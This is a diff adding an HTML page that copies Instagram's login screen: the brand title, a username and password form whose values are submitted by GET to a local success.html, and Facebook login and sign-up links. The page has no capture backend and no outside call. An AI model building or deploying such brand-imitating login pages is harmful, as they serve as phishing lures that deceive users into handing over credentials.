@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Instagram</title>
+    <p2>ENGLISH (United Kingdom) ^</p2>
+        <link rel="stylesheet" href ="style.css">
+        <link rel="stylesheet" href="success.html">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            p2{
+                text-align: center;
+                align-content: center;
+                 display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 50%;
+            }
+            h3{
+                color: cornflowerblue;
+                float: center;
+            }
+            p3{
+                color: midnightblue;
+                text-align: center;
+            }
+            p5{
+                color: royalblue;
+                text-align: center
+            }
+            
+            /* The device with borders */
+.smartphone {
+  position: relative;
+  width: 360px;
+  height: 640px;
+  margin: auto;
+  border: 16px black solid;
+  border-top-width: 60px;
+  border-bottom-width: 60px;
+  border-radius: 36px;
+}
+
+/* The horizontal line on the top of the device */
+.smartphone:before {
+  content: '';
+  display: block;
+  width: 60px;
+  height: 5px;
+  position: absolute;
+  top: -30px;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: #333;
+  border-radius: 10px;
+}
+
+/* The circle on the bottom of the device */
+.smartphone:after {
+  content: '';
+  display: block;
+  width: 35px;
+  height: 35px;
+  position: absolute;
+  left: 50%;
+  bottom: -65px;
+  transform: translate(-50%, -50%);
+  background: #333;
+  border-radius: 50%;
+}
+
+/* The screen (or content) of the device */
+.smartphone .content {
+  width: 360px;
+  height: 640px;
+  background: white;
+}
+        </style>
+    </head>
+<body>
+   
+    <form action="success.html" method="get">
+  <div class="imgcontainer">
+                    <header><img src ="img/images%20(4).jpeg"></header>
+
+  </div>
+
+  <div class="container">
+  
+    <input type="text" placeholder="Phone number,email address or Username" name="uname" required>
+
+    
+    
+ <input type="password" placeholder="Enter password" value="" id="myInput" name="psw" required>
+
+<!-- An element to toggle between password visibility -->
+<input type="checkbox" onclick="myFunction()">Show Password
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+        
+    </label>
+  </div>
+ <p1>Forgotten your login details? </p1> <p3><em>GET HELP SIGNING IN.</em></p3>
+        <br>
+        <br>
+        <img src ="img/img_facebook.png"><span class="psw"><a href="www.facebook.com">Log in With Facebook.</a></span>
+        <br>
+        <hr>               OR            <hr>
+       <p4> <span class="psw">Don't have an account?<a href="www.instagram.com">SIGN UP.</a></span></p4>
+  <div class="container" style="background-color:#f1f1f1">
+    
+  </div>
+</form>
+   <script>
+    function myFunction() {
+  var x = document.getElementById("myInput");
+  if (x.type === "password") {
+    x.type = "text";
+  } else {
+    x.type = "password";
+  }
+}
+
+  </script>   
+    </body>
+</html>
